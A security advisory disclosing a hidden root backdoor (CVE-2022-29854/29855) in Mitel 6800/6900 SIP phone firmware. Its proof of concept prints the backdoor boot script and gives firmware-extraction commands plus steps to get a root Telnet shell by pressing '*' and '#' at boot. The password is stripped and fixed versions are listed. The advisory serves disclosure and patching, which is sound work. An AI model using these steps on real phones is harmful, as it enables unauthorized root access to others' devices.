@@ -1,0 +1,178 @@
+id: 37803
+date: 06/21/2022
+title: Mitel 6800/6900 Series SIP Phones Backdoor Access Vulnerability
+author: Moritz Abrell
+cves: CVE-2022-29854, CVE-2022-29855
+
+Product:                   Mitel 6800/6900 Series SIP Phones excluding 6970
+                            Mitel 6900 Series IP (MiNet) Phones
+Manufacturer:              Mitel Networks Corporation
+Affected Version(s):       Rel 5.1 SP8 (5.1.0.8016) and earlier
+                            Rel 6.0 (6.0.0.368) to 6.1 HF4 (6.1.0.165)
+                            MiNet 1.8.0.12 and earlier
+Tested Version(s):         6.1.0.146
+Vulnerability Type:        Hidden Functionality (Backdoor) (CWE-912)
+Risk Level:                High
+Solution Status:           Fixed
+Manufacturer Notification: 2022-02-23
+Solution Date:             2022-05-03
+Public Disclosure:         2022-06-10
+CVE Reference:             CVE-2022-29854
+                            CVE-2022-29855
+Author of Advisory:        Moritz Abrell, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+Mitel Networks Corporation manufactures different IP- and SIP-based
+desk phones.
+
+The manufacturer describes these products, e.g., as follows:
+
+"The 6900 IP Series is a powerful suite of desk phones with crystal clear
+audio, advanced features and a broad array of accessories to improve
+productivity and mobility in today's modern business environment."
+
+The firmware of several phones contains an undocumented backdoor which
+allows an attacker to gain root access by pressing specific keys on
+system boot.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The shell script "check_mft.sh", which is located in the directory
+"/etc" on the phone, checks whether the keys "*" and "#" are pressed
+simultaneously during system startup.
+
+The phone then sets its IP address to "10.30.102.102" and starts a
+Telnet server. A Telnet login can then be performed with a static root
+password.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+1. Identify the backdoor
+
+1.1. Extract the jffs2 file system from an affected Mitel firmware:
+
+#> binwalk -e 6867i.st
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+- --------------------------------------------------------------------------------
+347           0x15B           Linux kernel ARM boot executable zImage (little-endian)
+15695         0x3D4F          gzip compressed data, maximum compression, from Unix, last modified: 2021-10-22 10:47:08
+1223395       0x12AAE3        JFFS2 filesystem, little endian
+
+
+1.2. Mount the jffs2 file system:
+
+#> modprobe jffs2
+#> modprobe mtdram total_size=70000
+#> modprobe mtdblock
+#> dd if=12AAE3.jffs2 of=/dev/mtdblock0
+#> mount -t jffs2 /dev/mtdblock0 /mnt/
+
+
+1.3. The script "check_mft.sh" located in the "/etc" directory contains
+the backdoor logic:
+
+#> cat /mnt/etc/check_mft.sh
+************* content shortened ****************
+#!/bin/sh
+
+case "$HOSTNAME" in
+
+#press and hold *  # two keys at the same time
+     
+      "bcm911109_6867i" | "6867i" | "bcm911107_praxis_3" |  "bcm911109_aquarius_3")
+         GPIODetect=`gpio get 4`
+         checkDhsgShorted
+         #KEY_OUT0 (GPIO52)  -> KEY_IN7 (GPIO50)  "DownKey" is press
+         isCCATest=`dbg rw 0x8000d000 8| grep "0x8000d000: 01ff 017f 01ff 01ff 01ff 01ff 01ff 01ff"`
+         
+         keyBoardScanMatch="True"
+         keycombinationMatch=`dbg rw 0x8000d000 8| grep "0x8000d000: 01ff 01ff 01ff 01ff 01af 01ff 01ff 01ff"`
+     ;;
+esac
+
+echo "keyBoardScanMatch = $keyBoardScanMatch,  dhsgShorted=$dhsgShorted "
+echo "GPIODetect = $GPIODetect,keycombinationMatch=$keycombinationMatch"
+echo "isCCATest = $isCCATest"
+
+if [ "$keyBoardScanMatch" -a $dhsgShorted -eq 1 -a $GPIODetect -eq "0" -o  "$keycombinationMatch" ]; then
+     mount -t jffs2 /dev/mtdblock3 /nvdata
+     if [ -f $ENETCFG ]; then
+         . $ENETCFG
+         MAC=${ENETCFG_MAC}
+     fi
+
+     /etc/if_bcm_net_setup.sh up
+     ifconfig eth0 hw ether $MAC
+     ifconfig eth0 10.30.102.102 netmask 255.255.255.0 up
+     
+     if [ -f /usr/sbin/telnetd ]; then
+          telnetd &
+     fi
+     exit 255
+fi
+************* content shortened ****************
+
+
+1.4. The file "ota_BCM911109_PRAXIS_3_voice_v6_5_jffs2.bin" located in
+the directory "/etc" contains another jffs2 file system.
+
+
+1.5. Extract and mount the file system as described in Steps 1
+and 2.
+
+
+1.6. The "check_mft.sh" in this file system also contains the root
+password which is set by default and forced by the script:
+
+#> cat /mnt/etc/check_mft.sh
+************* content shortened ****************
+if [ -f /usr/sbin/telnetd ]; then
+# make sure the default password is set for root.
+     (echo (password stripped out); sleep 1; echo (password stripped out) | passwd -a A
+     telnetd &
+fi
+************* content shortened ****************
+
+
+2. Exploiting
+
+2.1. Boot the phone and press the "*" and "#" keys simultaneously.
+
+
+2.2. Assign an IP address to communicate with the phone:
+
+#> ip addr add 10.30.102.100/24 dev eth0
+
+
+2.3. Now, logging in to the phone as the root user with the static password
+via Telnet is possible:
+
+#> telnet 10.30.102.102
+Trying 10.30.102.102...
+Connected to 10.30.102.102.
+Escape character is '^]'.
+
+(none) login: root
+Password:
+10.30.102.102 # id
+uid=0(root) gid=0(root) groups=0(root)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Upgrade to one of the following (or later) versions:
+- - 5.1 SP8 HF1 (5.1.0.8017)
+- - 6.1 HF5 (6.1.0.171)
+- - 6.2 SP1 (6.2.0.1012)
+- - MiNet 1.8.0.15
+
+#  0day.today [2023-03-22]  #
